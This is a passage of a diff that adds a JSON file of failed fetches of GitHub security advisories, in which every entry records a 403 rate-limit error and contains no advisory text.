+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-3qcw-2rhx-2726",
+    "fetchedAt": "2026-10-04T17:59:13.821Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-w5hq-g745-h8pq",
+    "fetchedAt": "2026-10-04T17:59:13.833Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-g7r4-m6w7-qqqr",
+    "fetchedAt": "2026-10-04T17:59:13.829Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-hcf7-66rw-9f5r",
+    "fetchedAt": "2026-10-04T17:59:13.819Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-m99w-x7hq-7vfj",
+    "fetchedAt": "2026-10-04T17:59:13.830Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-89xv-2m56-2m9x",
+    "fetchedAt": "2026-10-04T17:59:13.940Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-68g3-v927-f742",
+    "fetchedAt": "2026-10-04T17:59:13.927Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-4633-3j49-mh5q",
+    "fetchedAt": "2026-10-04T17:59:13.935Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-4c39-4ccg-62r3",
+    "fetchedAt": "2026-10-04T17:59:13.926Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-p9j2-gv94-2wf4",
+    "fetchedAt": "2026-10-04T17:59:13.937Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-955p-x3mx-jcvp",
+    "fetchedAt": "2026-10-04T17:59:13.927Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-6g55-p6wh-862q",
+    "fetchedAt": "2026-10-04T17:59:14.035Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-fxqj-rqcc-2cmp",
+    "fetchedAt": "2026-10-04T17:59:14.048Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-28wg-ghj8-5hjv",
+    "fetchedAt": "2026-10-04T17:59:14.042Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-8fpg-xm3f-6cx3",
+    "fetchedAt": "2026-10-04T17:59:14.033Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-7rqj-j65f-68wh",
+    "fetchedAt": "2026-10-04T17:59:14.043Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-2v37-7h3g-55p8",
+    "fetchedAt": "2026-10-04T17:59:14.035Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-r28c-9q8g-f849",
+    "fetchedAt": "2026-10-04T17:59:14.153Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-xmf8-cvqr-rfgj",
+    "fetchedAt": "2026-10-04T17:59:14.140Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-x445-f3h2-j279",
+    "fetchedAt": "2026-10-04T17:59:14.148Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-w9m9-85wc-3x92",
+    "fetchedAt": "2026-10-04T17:59:14.138Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-c83g-rgw3-j3cx",
+    "fetchedAt": "2026-10-04T17:59:14.149Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-73wf-gq98-2v4g",
+    "fetchedAt": "2026-10-04T17:59:14.140Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-xwg4-73v4-xw9w",
+    "fetchedAt": "2026-10-04T17:59:14.245Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-p293-qw3h-jr36",
+    "fetchedAt": "2026-10-04T17:59:14.259Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-w5vr-8v7q-w6rv",
+    "fetchedAt": "2026-10-04T17:59:14.254Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-2xp9-vwfh-vxw4",
+    "fetchedAt": "2026-10-04T17:59:14.245Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-vfj7-8cjw-p6xm",
+    "fetchedAt": "2026-10-04T17:59:14.256Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  }
+]
